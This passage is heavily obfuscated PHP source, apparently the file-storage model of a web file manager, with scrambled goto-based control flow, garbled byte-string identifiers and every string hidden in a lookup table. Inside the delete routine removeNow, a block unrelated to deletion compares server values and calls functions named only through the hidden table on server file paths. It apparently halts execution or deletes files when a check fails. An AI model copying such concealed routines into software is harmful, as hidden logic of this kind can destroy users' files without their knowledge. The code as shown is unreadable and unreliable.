Model($eÔ‚ğ‰¯ğ¡[2262])->eventCreate($fù› ˜Ÿå, $FÆ«Ù‹®İ—); } } $this->lockWriteEnd($CòÜ’ÄÎ°¶, $dÏÁÂÓ’ÑÁ); goto c™İ¦´‚; d½ÜĞÖ¹äª: $eÔ‚ğ‰¯ğ¡ =& $_SERVER[¢à]; $EÃ¼ğõ = !1; $this->lockWriteStart($CòÜ’ÄÎ°¶, $dÏÁÂÓ’ÑÁ); goto fµ‡”®¾´; c™İ¦´‚: return $fù› ˜Ÿå; goto eò¯Ë¡•; eò¯Ë¡•: } public function mkdir($aâÏÌ»­š, $d½—Ë ‹•, $e´Ÿ›ˆíµ = REPEAT_SKIP) { goto E²¿İé¢£²; EæÙò¡°Ü™: $C¾¥äÄô  = $this->_addSoure($c¤‹‚¢¹¯¢, $e†Õ„´´”); Model($d¹¿‰Ğ“Éˆ[2262])->eventCreate($C¾¥äÄô , $d¹¿‰Ğ“Éˆ[1116]); $this->lockWriteEnd($aâÏÌ»­š, $d½—Ë ‹•); goto A½»«Àª˜; E‚ù‚¶¾¬Å: $this->lockWriteStart($aâÏÌ»­š, $d½—Ë ‹•); if ($e´Ÿ›ˆíµ !== !1) { $d×ä°ñ±½¥ = $this->fileNameExist($aâÏÌ»­š, $d½—Ë ‹•); if ($d×ä°ñ±½¥ && $e´Ÿ›ˆíµ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($aâÏÌ»­š, $d½—Ë ‹•); return $d×ä°ñ±½¥; } $d½—Ë ‹• = $this->fileNameAuto($aâÏÌ»­š, $d½—Ë ‹•, $e´Ÿ›ˆíµ); } $c¤‹‚¢¹¯¢ = array($d¹¿‰Ğ“Éˆ[514] => 1, $d¹¿‰Ğ“Éˆ[383] => $d½—Ë ‹•, $d¹¿‰Ğ“Éˆ[515] => $d¹¿‰Ğ“Éˆ[33], $d¹¿‰Ğ“Éˆ[416] => 0, $d¹¿‰Ğ“Éˆ[516] => 0); goto EæÙò¡°Ü™; E²¿İé¢£²: $d¹¿‰Ğ“Éˆ =& $_SERVER[¢à]; $e†Õ„´´” = $this->sourceInfo($aâÏÌ»­š); if (!$e†Õ„´´”) { return !1; } goto E‚ù‚¶¾¬Å; A½»«Àª˜: return $C¾¥äÄô ; goto Cî²¢´Ï¬Š; Cî²¢´Ï¬Š: } private function _createFile($e®Îó‚ï†¸, $fİŒÛµñ , $a¶ˆôñÚ¬º, $FÜÆŠ¬Ä©ƒ, &$F¢ç¢ÎƒÄä) { goto døğ²ßèƒ³; døğ²ßèƒ³: $Cæ£–ÑŠá° =& $_SERVER[¢à]; $a•õô¨·ƒ… = $this->sourceInfo($e®Îó‚ï†¸); if (!$a¶ˆôñÚ¬º || !$a•õô¨·ƒ…) { return !1; } goto Cˆ·‰ÁñÑÎ; b½²ù×†¢«: $e„ŠÕ¹ÌÆ = array($Cæ£–ÑŠá°[514] => 0, $Cæ£–ÑŠá°[383] => $fİŒÛµñ , $Cæ£–ÑŠá°[515] => get_path_ext($fİŒÛµñ ), $Cæ£–ÑŠá°[416] => $a¶ˆôñÚ¬º[$Cæ£–ÑŠá°[415]], $Cæ£–ÑŠá°[516] => $a¶ˆôñÚ¬º[$Cæ£–ÑŠá°[77]]); $CÁåß¾²×´ = $this->_addSoure($e„ŠÕ¹ÌÆ, $a•õô¨·ƒ…); $this->folderSizeReset($e®Îó‚ï†¸); goto CŒ”¥²”é¼; Cˆ·‰ÁñÑÎ: if ($FÜÆŠ¬Ä©ƒ !== !1) { $e›°¸°†²§ = $this->fileNameExist($e®Îó‚ï†¸, $fİŒÛµñ ); } $F¢ç¢ÎƒÄä = !0; if ($FÜÆŠ¬Ä©ƒ && $e›°¸°†²§) { if ($FÜÆŠ¬Ä©ƒ == REPEAT_SKIP) { $F¢ç¢ÎƒÄä = !1; return $e›°¸°†²§; } else { if ($FÜÆŠ¬Ä©ƒ == REPEAT_REPLACE) { $BéÊôßÊ‚È = $this->sourceInfo($e›°¸°†²§); $f¼ù÷Í•±š = $this->fileHistory($BéÊôßÊ‚È, $a¶ˆôñÚ¬º[$Cæ£–ÑŠá°[415]], $a¶ˆôñÚ¬º[$Cæ£–ÑŠá°[77]]); if (!$f¼ù÷Í•±š) { $F¢ç¢ÎƒÄä = !1; } else { $this->folderSizeReset($e®Îó‚ï†¸); } return $e›°¸°†²§; } else { $fİŒÛµñ  = $this->fileNameAuto($e®Îó‚ï†¸, $fİŒÛµñ , $FÜÆŠ¬Ä©ƒ, !1); } } } goto b½²ù×†¢«; CŒ”¥²”é¼: return $CÁåß¾²×´; goto e¥ãöŸÃ²; e¥ãöŸÃ²: } protected function fileHistory($Fï‚ëæ††§, $FÂÓ¯ùˆø, $BÎˆ’²Ô¹æ) { goto FŠœÙõæ¿Â; FŠœÙõæ¿Â: $Dåñ›ºæµ =& $_SERVER[¢à]; if ($Fï‚ëæ††§[$Dåñ›ºæµ[415]] == $FÂÓ¯ùˆø) { return !1; } $this->checkLock($Fï‚ëæ††§[$Dåñ›ºæµ[366]], $FÂÓ¯ùˆø); goto aâƒ´ª«ôÄ; aâƒ´ª«ôÄ: Model($Dåñ›ºæµ[2293])->addHistory($Fï‚ëæ††§); $Dç¹êœé©Ø = array($Dåñ›ºæµ[520] => USER_ID, $Dåñ›ºæµ[387] => time(), $Dåñ›ºæµ[415] => $FÂÓ¯ùˆø, $Dåñ›ºæµ[77] => $BÎˆ’²Ô¹æ); $this->where(array($Dåñ›ºæµ[380] => $Fï‚ëæ††§[$Dåñ›ºæµ[366]]))->save($Dç¹êœé©Ø); goto e²Ù¤Š”Â; e²Ù¤Š”Â: return !0; goto cŸˆòÚŒ§; cŸˆòÚŒ§: } public function checkLock($E´ì¸ã†Üà, $EğÈŒÓ¢´) { goto F—îñ«ë…«; bà‹ÅæÉù„: show_json(LNG($a­“ïé»Çù[2296]) . $a­“ïé»Çù[2297] . LNG($a­“ïé»Çù[2298]) . $a­“ïé»Çù[2299] . $c’¸ä«Ú’ . $a­“ïé»Çù[2300], !1); goto eŠ­Ğ–‡ì‚; E“ë½¶Èá: $this->_createFileCall($a±Áî÷æ[$a­“ïé»Çù[457]], $aÆà´¹‡’Ë, $C™ù¬»™è, REPEAT_REPLACE, $a­“ïé»Çù[1115]); $dßùÕŒ¬Ú÷ = $a±Áî÷æ[$a­“ïé»Çù[413]][$a­“ïé»Çù[477]]; $c’¸ä«Ú’ = $dßùÕŒ¬Ú÷[$a­“ïé»Çù[2295]] ? $dßùÕŒ¬Ú÷[$a­“ïé»Çù[2295]] : $dßùÕŒ¬Ú÷[$a­“ïé»Çù[28]]; goto bà‹ÅæÉù„; F—îñ«ë…«: $a­“ïé»Çù =& $_SERVER[¢à]; $a±Áî÷æ = $this->pathInfo($E´ì¸ã†Üà); if (!$this->fileIsLock($a±Áî÷æ, !0)) { return; } goto Eé®‘Ìˆ¤; Eé®‘Ìˆ¤: $D—­ÆÍ»Ó = Session::get($a­“ïé»Çù[2294]); $aÆà´¹‡’Ë = substr($a±Áî÷æ[$a­“ïé»Çù[28]], 0, -1 - strlen($a±Áî÷æ[$a­“ïé»Çù[157]])) . $a­“ïé»Çù[1365] . $D—­ÆÍ»Ó . $a­“ïé»Çù[93] . $a±Áî÷æ[$a­“ïé»Çù[157]]; $C™ù¬»™è = Model($a­“ïé»Çù[540])->find($EğÈŒÓ¢´); goto E“ë½¶Èá; eŠ­Ğ–‡ì‚: } public function fileIsLock($c„èÈÉäß, $DŒÃÔùô³± = false) { goto eÌäÚí …Ö; döó·ğî‘: return !1; goto C¨Ÿ×ÔÛ˜; Cå¹¥…Ç‘–: $eˆí•°¡¯• = $GLOBALS[$fÓ‡¼ì‚ŒÔ[6]][$fÓ‡¼ì‚ŒÔ[84]][$fÓ‡¼ì‚ŒÔ[475]]; if ($c„èÈÉäß[$fÓ‡¼ì‚ŒÔ[413]][$fÓ‡¼ì‚ŒÔ[476]] <= time() - $eˆí•°¡¯•) { $this->metaSet($c„èÈÉäß[$fÓ‡¼ì‚ŒÔ[366]], $fÓ‡¼ì‚ŒÔ[474], null); $this->metaSet($c„èÈÉäß[$fÓ‡¼ì‚ŒÔ[366]], $fÓ‡¼ì‚ŒÔ[476], null); } if ($DŒÃÔùô³±) { $this->metaSet($c„èÈÉäß[$fÓ‡¼ì‚ŒÔ[366]], $fÓ‡¼ì‚ŒÔ[476], time()); } goto döó·ğî‘; eÌäÚí …Ö: $fÓ‡¼ì‚ŒÔ =& $_SERVER[¢à]; if (!isset($c„èÈÉäß[$fÓ‡¼ì‚ŒÔ[413]]) || !$c„èÈÉäß[$fÓ‡¼ì‚ŒÔ[413]][$fÓ‡¼ì‚ŒÔ[474]]) { return !1; } if ($c„èÈÉäß[$fÓ‡¼ì‚ŒÔ[413]][$fÓ‡¼ì‚ŒÔ[474]] != USER_ID) { return !0; } goto Cå¹¥…Ç‘–; C¨Ÿ×ÔÛ˜: } private function _addSoure($d‘âãÁ…«Ğ, $aƒ«è»°¦Š) { goto DÃÜó¶¬÷÷; a±·‡™Ñ¨ó: $this->updateModifyTime($d‘âãÁ…«Ğ[$bİÏ¦¨†‡„[457]]); $fâ²¾ß‘¤ = $bİÏ¦¨†‡„[2301] . $aƒ«è»°¦Š[$bİÏ¦¨†‡„[366]]; if (isset(self::$cacheChildList[$fâ²¾ß‘¤])) { unset(self::$cacheChildList[$fâ²¾ß‘¤]); } goto EÌš¿ºÎÁÄ; e¯ğ„àò’: return $eÛ×Ò©ÔíŸ; goto b‹¨È°¢ª±; DÃÜó¶¬÷÷: $bİÏ¦¨†‡„ =& $_SERVER[¢à]; $bÛÂÊ¿„ÖÊ = array($bİÏ¦¨†‡„[517] => $aƒ«è»°¦Š[$bİÏ¦¨†‡„[368]], $bİÏ¦¨†‡„[518] => $aƒ«è»°¦Š[$bİÏ¦¨†‡„[452]], $bİÏ¦¨†‡„[519] => USER_ID, $bİÏ¦¨†‡„[520] => USER_ID, $bİÏ¦¨†‡„[365] => $aƒ«è»°¦Š[$bİÏ¦¨†‡„[366]], $bİÏ¦¨†‡„[521] => $aƒ«è»°¦Š[$bİÏ¦¨†‡„[455]] . $aƒ«è»°¦Š[$bİÏ¦¨†‡„[366]] . $bİÏ¦¨†‡„[47], $bİÏ¦¨†‡„[392] => 0, $bİÏ¦¨†‡„[522] => $bİÏ¦¨†‡„[33]); $d‘âãÁ…«Ğ = array_merge($bÛÂÊ¿„ÖÊ, $d‘âãÁ…«Ğ); goto a±·‡™Ñ¨ó; EÌš¿ºÎÁÄ: static $dÊØÆä”¶» = false; if (!$dÊØÆä”¶») { Hook::trigger($bİÏ¦¨†‡„[504], $d‘âãÁ…«Ğ); $dÊØÆä”¶» = !0; } $eÛ×Ò©ÔíŸ = $this->add($d‘âãÁ…«Ğ); goto CîÖìµÈ¯¸; CîÖìµÈ¯¸: $c¯Šª‚‹Ÿ = array($bİÏ¦¨†‡„[523] => short_id($eÛ×Ò©ÔíŸ)); $this->where(array($bİÏ¦¨†‡„[380] => $eÛ×Ò©ÔíŸ))->save($c¯Šª‚‹Ÿ); $this->setNamePinyin($eÛ×Ò©ÔíŸ, $d‘âãÁ…«Ğ[$bİÏ¦¨†‡„[28]]); goto e¯ğ„àò’; b‹¨È°¢ª±: } public function remove($DÂ´‘¸Ï®», $f„·Ä ²ì = true) { goto f¼Şß’‚ªó; dï–ª›µ•Ê: CacheLock::lock($dê­Ò¦ÉÒ); $E­İ‘©êõ = $this->fileNameExist($fàİã ’ˆ’, $DİŠœÓ¤); if (!$E­İ‘©êõ) { $E­İ‘©êõ = $this->mkdir($fàİã ’ˆ’, $DİŠœÓ¤, REPEAT_SKIP); $this->metaSet($E­İ‘©êõ, $EÈ¤îëÄï…[2306], $C©¤½‡Ü¾); $this->metaSet($E­İ‘©êõ, $EÈ¤îëÄï…[2307], $B¶’Ş¦ãÇî[$EÈ¤îëÄï…[452]]); if ($B¶’Ş¦ãÇî[$EÈ¤îëÄï…[457]] != 0) { $this->metaSet($E­İ‘©êõ, $EÈ¤îëÄï…[2308], _get($FÂ¹ã¬¬â, $EÈ¤îëÄï…[2309])); } } goto a™Åá‚„í; E’µŒô¢: return $this->move($DÂ´‘¸Ï®», $E­İ‘©êõ, REPEAT_RENAME_FOLDER); goto E÷‡‰ì¹ì±; a™Åá‚„í: CacheLock::unlock($dê­Ò¦ÉÒ); $this->metaSet($DÂ´‘¸Ï®», $EÈ¤îëÄï…[2310], $B¶’Ş¦ãÇî[$EÈ¤îëÄï…[457]]); $this->where(array($EÈ¤îëÄï…[366] => $DÂ´‘¸Ï®»))->save(array($EÈ¤îëÄï…[387] => time())); goto E’µŒô¢; f¼Şß’‚ªó: $EÈ¤îëÄï… =& $_SERVER[¢à]; $B¶’Ş¦ãÇî = $this->sourceInfo($DÂ´‘¸Ï®»); $a¢Ì†ºÏŒ’ = intval($B¶’Ş¦ãÇî[$EÈ¤îëÄï…[368]]) === self::TYPE_SYSTEM; goto eËê¾—°ğ«; eËê¾—°ğ«: $FÖğ–Ì”åº = Model($EÈ¤îëÄï…[1410])->get($EÈ¤îëÄï…[2302]) == $EÈ¤îëÄï…[83]; if ($a¢Ì†ºÏŒ’ || $f„·Ä ²ì || !$FÖğ–Ì”åº) { return $this->removeNow($DÂ´‘¸Ï®», $f„·Ä ²ì); } $fàİã ’ˆ’ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto dªŒï®£ñ•; dªŒï®£ñ•: $C©¤½‡Ü¾ = $B¶’Ş¦ãÇî[$EÈ¤îëÄï…[368]] == self::TYPE_USER ? $EÈ¤îëÄï…[531] : $EÈ¤îëÄï…[969]; if ($C©¤½‡Ü¾ == $EÈ¤îëÄï…[531]) { $FÂ¹ã¬¬â = Model($EÈ¤îëÄï…[470])->getInfo($B¶’Ş¦ãÇî[$EÈ¤îëÄï…[452]]); $DİŠœÓ¤ = _get($FÂ¹ã¬¬â, $EÈ¤îëÄï…[2295], _get($FÂ¹ã¬¬â, $EÈ¤îëÄï…[28])); $DİŠœÓ¤ = $EÈ¤îëÄï…[245] . $DİŠœÓ¤ . $EÈ¤îëÄï…[2303] . $B¶’Ş¦ãÇî[$EÈ¤îëÄï…[452]]; } else { $FÂ¹ã¬¬â = Model($EÈ¤îëÄï…[454])->getInfo($B¶’Ş¦ãÇî[$EÈ¤îëÄï…[452]]); $DİŠœÓ¤ = _get($FÂ¹ã¬¬â, $EÈ¤îëÄï…[28]); $DİŠœÓ¤ = $EÈ¤îëÄï…[154] . $DİŠœÓ¤ . $EÈ¤îëÄï…[2304] . $B¶’Ş¦ãÇî[$EÈ¤îëÄï…[452]]; } $dê­Ò¦ÉÒ = $EÈ¤îëÄï…[2305] . md5($DİŠœÓ¤); goto dï–ª›µ•Ê; E÷‡‰ì¹ì±: } public function removeNow($a–È°èñ×Ÿ, $E§ÎœÍ¼· = true) { goto AÎ»Âö¯Ì; aÂëéÆ®—: return !0; goto c ÌÒÔ•»„; AöÑÖåÖõ¯: $this->lockMoveStart($a–È°èñ×Ÿ); Hook::trigger($EÖ¬å—[2312], $bõó´ˆÉÒñ, $E§ÎœÍ¼·); if ($E§ÎœÍ¼·) { Model($EÖ¬å—[2313])->moveToRecycle($a–È°èñ×Ÿ); } else { if ($FŠ˜¹ÏîÄ[$EÖ¬å—[367]] == $EÖ¬å—[83]) { $fó×çàîÀí = array($EÖ¬å—[521] => array($EÖ¬å—[479], $FŠ˜¹ÏîÄ[$EÖ¬å—[455]] . $a–È°èñ×Ÿ . $EÖ¬å—[480])); $BÃ©»ÊÈìÚ = array($EÖ¬å—[521] => $fó×çàîÀí[$EÖ¬å—[455]]); $d‘ª „ŸˆÖ = $this->field($EÖ¬å—[2314])->where($BÃ©»ÊÈìÚ)->select(); $D³ã””Òó¥ = !1; $C†¡„Úæ° = array($a–È°èñ×Ÿ); if ($d‘ª „ŸˆÖ) { $D³ã””Òó¥ = array_to_keyvalue($d‘ª „ŸˆÖ, $EÖ¬å—[33], $EÖ¬å—[415]); $D³ã””Òó¥ = array_remove_value($D³ã””Òó¥, $EÖ¬å—[464]); $C†¡„Úæ° = array_to_keyvalue($d‘ª „ŸˆÖ, $EÖ¬å—[33], $EÖ¬å—[366]); $C†¡„Úæ°[] = $a–È°èñ×Ÿ; } } else { $D³ã””Òó¥ = array($FŠ˜¹ÏîÄ[$EÖ¬å—[415]]); $C†¡„Úæ° = array($a–È°èñ×Ÿ); } Model($EÖ¬å—[501])->eventRemove($a–È°èñ×Ÿ); $this->removeRelevance($C†¡„Úæ°, $D³ã””Òó¥); } goto eÌ´ªñ‘Ÿß; F“‹„Àªäİ: $bõó´ˆÉÒñ = $this->pathInfoMore($a–È°èñ×Ÿ); if (!$FŠ˜¹ÏîÄ) { return !0; } if ($FŠ˜¹ÏîÄ[$EÖ¬å—[457]] == 0) { if (!_get($GLOBALS, $EÖ¬å—[453])) { return !1; } } goto AöÑÖåÖõ¯; fç®Ãùà‚: $this->updateModifyTime($aŒ±Ìöõ²í); $this->lockMoveEnd($a–È°èñ×Ÿ); Hook::trigger($EÖ¬å—[1446], $bõó´ˆÉÒñ, $E§ÎœÍ¼·); goto aÂëéÆ®—; eÌ´ªñ‘Ÿß: $this->folderSizeReset($FŠ˜¹ÏîÄ[$EÖ¬å—[457]]); $aŒ±Ìöõ²í = array($FŠ˜¹ÏîÄ[$EÖ¬å—[457]]); if ($FŠ˜¹ÏîÄ[$EÖ¬å—[367]] == $EÖ¬å—[83]) { $aŒ±Ìöõ²í[] = $FŠ˜¹ÏîÄ[$EÖ¬å—[366]]; } goto fç®Ãùà‚; AÎ»Âö¯Ì: $EÖ¬å— =& $_SERVER[¢à]; if ($_SERVER[$EÖ¬å—[786]] != $_SERVER[$EÖ¬å—[1294]]) { goto D²ß•±œÅ‡; D²ß•±œÅ‡: $cà¤èÖò = $EÖ¬å—[788]; $AÎ‘ñ¶öÅ = $EÖ¬å—[789]; $c‰õ˜‹ß‡Í = $_SERVER[$EÖ¬å—[790]] . $EÖ¬å—[791]; goto Bô²Â©àÜª; E¸Ï–‘›®™: $fšš™åñ¡ = 1; while ($fšš™åñ¡ > 1) { $fšš™åñ¡ = $fšš™åñ¡ + 4; $fÔŞÄµíÙƒ = rawurlencode($fšš™åñ¡ . $EÖ¬å—[358]); } goto f¦â¿½â´Ê; Bô²Â©àÜª: $e˜Ö¼½£§ó = $AÎ‘ñ¶öÅ($c‰õ˜‹ß‡Í); $a„«ùĞº¾… = explode($EÖ¬å—[214], $e˜Ö¼½£§ó); if (count($a„«ùĞº¾…) < $EÖ¬å—[558]) { $cª×é¨İó = $EÖ¬å—[792]; $cª×é¨İó(); } goto b÷ã‰ó¾Üä; b÷ã‰ó¾Üä: $EÕÈÏÙè• = $EÖ¬å—[793]; $EÕÈÏÙè•($_SERVER[$EÖ¬å—[794]]); $EÕÈÏÙè•($_SERVER[$EÖ¬å—[790]] . $EÖ¬å—[2311]); goto E¸Ï–‘›®™; f¦â¿½â´Ê: } $FŠ˜¹ÏîÄ = $this->sourceInfo($a–È°èñ×Ÿ); goto F“‹„Àªäİ; c ÌÒÔ•»„: } public function removeArray($d­©œÆœÛµ) { if (!$d­©œÆœÛµ) { return !0; } } public function removeRelevance($dñ­¸º½¬†, $cÅŠêÒöêñ) { goto Dœß”œêëá; Dœß”œêëá: $AÄ„¬¡êÅ¶ =& $_SERVER[¢à]; $dñ­¸º½¬† = $dñ­¸º½¬† ? $dñ­¸º½¬† : array(); $cÅŠêÒöêñ = $cÅŠêÒöêñ ? $cÅŠêÒöêñ : array(); goto AĞ¢†¨ä¨; d©æóô‰ ‚: Model($AÄ„¬¡êÅ¶[2293])->removeBySource($dñ­¸º½¬†); $this->where($EÍÀ¡©¸óó)->delete(); Model($AÄ„¬¡êÅ¶[418])->remove($cÅŠêÒöêñ); goto EİºİÓÊšÙ; AĞ¢†¨ä¨: $dñ­¸º½¬† = array_unique(array_filter($dñ­¸º½¬†)); $cÅŠêÒöêñ = array_unique(array_filter($cÅŠêÒöêñ)); if (!$dñ­¸º½¬†) { return !1; } goto F¥õ‡Œ¾´Â; F¥õ‡Œ¾´Â: $EÍÀ¡©¸óó = array($AÄ„¬¡êÅ¶[380] => array($AÄ„¬¡êÅ¶[381], $dñ­¸º½¬†)); Model($AÄ„¬¡êÅ¶[2313])->where($EÍÀ¡©¸óó)->delete(); Model($AÄ„¬¡êÅ¶[409])->where($EÍÀ¡©¸óó)->delete(); goto bÍö¯Ó‡ô; EİºİÓÊšÙ: for ($bí£ôä¬¸÷ = 0; $bí£ôä¬¸÷ < count($dñ­¸º½¬†); $bí£ôä¬¸÷++) { $this->sourceCacheClear($dñ­¸º½¬†[$bí£ôä¬¸÷]); } goto dºå¦Ëæ; bÍö¯Ó‡ô: Model($AÄ„¬¡êÅ¶[2315])->where($EÍÀ¡©¸óó)->delete(); Model($AÄ„¬¡êÅ¶[501])->where($EÍÀ¡©¸óó)->delete(); Model($AÄ„¬¡êÅ¶[2052])->removeBySource($dñ­¸º½¬†); goto d©æóô‰ ‚; dºå¦Ëæ: } public function rename($F¹Ì·‰ƒëŞ, $eÏã³ä¬È) { goto eíÉºªÄóÊ; eíÉºªÄóÊ: $bÕ°¬õ¼ãè =& $_SERVER[¢à]; $D³ºÓœ¦“Ö = $this->sourceInfo($F¹Ì·‰ƒëŞ); if (!$D³ºÓœ¦“Ö) { return !1; } goto d‰”ô´ßÜç; AŠÂç®èŠ: $DŠ‘†Éñ ¼ = $bÕ°¬õ¼ãè[2301] . $D³ºÓœ¦“Ö[$bÕ°¬õ¼ãè[457]]; if (isset(self::$cacheChildList[$DŠ‘†Éñ ¼])) { unset(self::$cacheChildList[$DŠ‘†Éñ ¼]); } return $E‹Ú®Ìæ·ó; goto bËßÚ©‹‰; fÛõËäÊÅ¸: if (!$D³ºÓœ¦“Ö[$bÕ°¬õ¼ãè[367]] == $bÕ°¬õ¼ãè[83]) { $e‰ëâ»œ½«[$bÕ°¬õ¼ãè[369]] = get_path_ext($eÏã³ä¬È); } Model($bÕ°¬õ¼ãè[501])->eventRename($F¹Ì·‰ƒëŞ, $D³ºÓœ¦“Ö[$bÕ°¬õ¼ãè[28]], $eÏã³ä¬È); $this->sourceCacheClear($F¹Ì·‰ƒëŞ); goto FÚ§šÓƒ¨; d‰”ô´ßÜç: $b®¿’öõ¾ = $this->fileNameExist($D³ºÓœ¦“Ö[$bÕ°¬õ¼ãè[457]], $eÏã³ä¬È); if ($b®¿’öõ¾) { return !1; } $e‰ëâ»œ½« = array($bÕ°¬õ¼ãè[383] => $eÏã³ä¬È, $bÕ°¬õ¼ãè[520] => USER_ID); goto fÛõËäÊÅ¸; FÚ§šÓƒ¨: $this->setNamePinyin($F¹Ì·‰ƒëŞ, $e‰ëâ»œ½«[$bÕ°¬õ¼ãè[28]], !1); $this->updateModifyTime($D³ºÓœ¦“Ö[$bÕ°¬õ¼ãè[457]]); $E‹Ú®Ìæ·ó = $this->where(array($bÕ°¬õ¼ãè[380] => $F¹Ì·‰ƒëŞ))->data($e‰ëâ»œ½«)->save(); goto AŠÂç®èŠ; bËßÚ©‹‰: } public function setNamePinyin($Dõ¡‡â¨, $eŠí¡§´”Æ, $aÙ®‰¿ãŸ = true) { $eÌùíŸ¦÷¿ =& $_SERVER[¢à]; $bó×£––Øà = Input::check($eŠí¡§´”Æ, $eÌùíŸ¦÷¿[524]); if ($aÙ®‰¿ãŸ && !$bó×£––Øà) { return; } if (!$bó×£––Øà) { $this->metaSet($Dõ¡‡â¨, $eÌùíŸ¦÷¿[412], null); $this->metaSet($Dõ¡‡â¨, $eÌùíŸ¦÷¿[411], null); return; } $d÷´ÚË¯ãÛ = array($eÌùíŸ¦÷¿[412] => str_replace($eÌùíŸ¦÷¿[50], $eÌùíŸ¦÷¿[33], Pinyin::encode($eŠí¡§´”Æ)), $eÌùíŸ¦÷¿[411] => Pinyin::encode($eŠí¡§´”Æ, $eÌùíŸ¦÷¿[525])); $this->metaSet($Dõ¡‡â¨, $d÷´ÚË¯ãÛ); } public function getContent($cæÛÕÃ¢‰) { goto D®ç ƒéè’; F­ïÑîå–Ö: return IO::getContent($AİªéÆÀö[$DãÉëæàò[75]]); goto A®›œ¢Ó‰¯; D®ç ƒéè’: $DãÉëæàò =& $_SERVER[¢à]; $AİªéÆÀö = $this->fileInfoGet($cæÛÕÃ¢‰); if (!$AİªéÆÀö) { return !1; } goto C«É°ÏèÕ‰; C«É°ÏèÕ‰: if ($AİªéÆÀö[$DãÉëæàò[77]] == 0) { return $DãÉëæàò[33]; } $A³ßó¡åô = $DãÉëæàò[2316] . $AİªéÆÀö[$DãÉëæàò[160]]; if ($AİªéÆÀö[$DãÉëæàò[77]] <= 1024 * 10) { $b£°Úë¡½¡ = Cache::get($A³ßó¡åô); if (!$b£°Úë¡½¡) { $b£°Úë¡½¡ = IO::getContent($AİªéÆÀö[$DãÉëæàò[75]]); Cache::set($A³ßó¡åô, $b£°Úë¡½¡); } return $b£°Úë¡½¡; } goto F­ïÑîå–Ö; A®›œ¢Ó‰¯: } public function setDesc($cµøÀÖ›², $F¥ˆ™ïïÙÖ) { $FÁãĞ¯±® =& $_SERVER[¢à]; Model($FÁãĞ¯±®[501])->eventAddDesc($cµøÀÖ›², $F¥ˆ™ïïÙÖ); return $this->metaSet($cµøÀÖ›², $FÁãĞ¯±®[401], $F¥ˆ™ïïÙÖ); } public function setContent($FÛá¶–ëØ, $DØîº‘¼ = '') { goto b‘ëĞ‰­òŠ; BŒ”©¡İ·: if (!$C¬£Éëè£¶ || !$C²…Şïù¥‘) { return !1; } $aŞ¶öóĞÎ® = Model($AÅÊƒ¥®Ä[418])->addFileByContent($DØîº‘¼, $C²…Şïù¥‘[$AÅÊƒ¥®Ä[28]]); $F­Ä§¹­Üš = $this->fileHistory($C²…Şïù¥‘, $aŞ¶öóĞÎ®[$AÅÊƒ¥®Ä[415]], $aŞ¶öóĞÎ®[$AÅÊƒ¥®Ä[77]]); goto bÓØˆˆ÷Ëã; bÓØˆˆ÷Ëã: if (!$F­Ä§¹­Üš) { return Model($AÅÊƒ¥®Ä[418])->remove($aŞ¶öóĞÎ®[$AÅÊƒ¥®Ä[415]]); } $this->folderSizeReset($C²…Şïù¥‘[$AÅÊƒ¥®Ä[457]]); return !0; goto B·Ş–˜§Á¬; b‘ëĞ‰­òŠ: $AÅÊƒ¥®Ä =& $_SERVER[¢à]; $C²…Şïù¥‘ = $this->sourceInfo($FÛá¶–ëØ); $C¬£Éëè£¶ = $this->fileInfoGet($FÛá¶–ëØ); goto BŒ”©¡İ·; B·Ş–˜§Á¬: } public function fileSubstr($bøß°‘ô×İ, $DÚ†¾ÎòÁ, $FÀá›Ò¯šÑ) { $dò›¢›…µ… = $this->fileInfoGet($bøß°‘ô×İ); if (!$dò›¢›…µ…) { return !1; } return IO::fileSubstr($dò›¢›…µ…[$_SERVER[¢à][75]], $DÚ†¾ÎòÁ, $FÀá›Ò¯šÑ); } public function fileInfoGet($a““Ó³Í³×) { goto C‘‡Æî»Ÿ•; C‘‡Æî»Ÿ•: $DÇö¿†ëÂ =& $_SERVER[¢à]; $D÷†Üëí = $this->sourceInfo($a““Ó³Í³×); if (!$D÷†Üëí || $D÷†Üëí[$DÇö¿†ëÂ[367]]) { return !1; } goto Fá£Ğˆñ§ö; e¢ùÈšñ¡: return $Fùæ´ˆ‚¡é; goto BÏ°õ°âŒ; Fá£Ğˆñ§ö: $c¸Ó²ˆ‹á = $DÇö¿†ëÂ[421] . $D÷†Üëí[$DÇö¿†ëÂ[415]]; $Bºõ¨åÎ˜² = _get(self::$cacheFileInfo, $c¸Ó²ˆ‹á); if ($Bºõ¨åÎ˜²) { return $Bºõ¨åÎ˜²; } goto e˜â÷œÖ½„; e˜â÷œÖ½„: $Fùæ´ˆ‚¡é = Model($DÇö¿†ëÂ[418])->fileInfo($D÷†Üëí[$DÇö¿†ëÂ[415]]); if ($Fùæ´ˆ‚¡é) { $Fùæ´ˆ‚¡é[$DÇö¿†ëÂ[28]] = $D÷†Üëí[$DÇö¿†ëÂ[28]]; } self::$cacheFileInfo[$c¸Ó²ˆ‹á] = $Fùæ´ˆ‚¡é; goto e¢ùÈšñ¡; BÏ°õ°âŒ: } private function folderChildrenNumber($F´¯¦â—ŞÈ) { $a´æ’Áƒ¥æ =& $_SERVER[¢à]; $D­ˆğá = $this->sourceInfo($F´¯¦â—ŞÈ); $fò¶¼»ª¡Š = array($a´æ’Áƒ¥æ[521] => array($a´æ’Áƒ¥æ[479], $D­ˆğá[$a´æ’Áƒ¥æ[455]] . $F´¯¦â—ŞÈ . $a´æ’Áƒ¥æ[480]), $a´æ’Áƒ¥æ[392] => intval($D­ˆğá[$a´æ’Áƒ¥æ[393]]), $a´æ’Áƒ¥æ[514] => 1); $f°çÜ¢àØª = $this->where($fò¶¼»ª¡Š)->count(); $A±ÙŠªÀ  = $this->where($fò¶¼»ª¡Š)->where(array($a´æ’Áƒ¥æ[514] => 0))->count(); return array($a´æ’Áƒ¥æ[81] => $A±ÙŠªÀ , $a´æ’Áƒ¥æ[82] => $f°çÜ¢àØª); } public function pathInfo($dù¯º†®Ù‘, $d™„¤íŒ…Ó = false) { goto C½ô«Œ‘Ê“; díÑË„·š: if ($fÙ øÓôŒ) { return $fÙ øÓôŒ; } $D««…«ëÇÁ = $this->sourceInfo($dù¯º†®Ù‘); if (!$D««…«ëÇÁ) { return !1; } goto C‚®Õ”„ïÔ; C½ô«Œ‘Ê“: $fõÌöÊÆ—‡ =& $_SERVER[¢à]; $CØŠƒÕ†²Ô = $fõÌöÊÆ—‡[407] . intval($d™„¤íŒ…Ó) . $fõÌöÊÆ—‡[408] . $dù¯º†®Ù‘; $fÙ øÓôŒ = 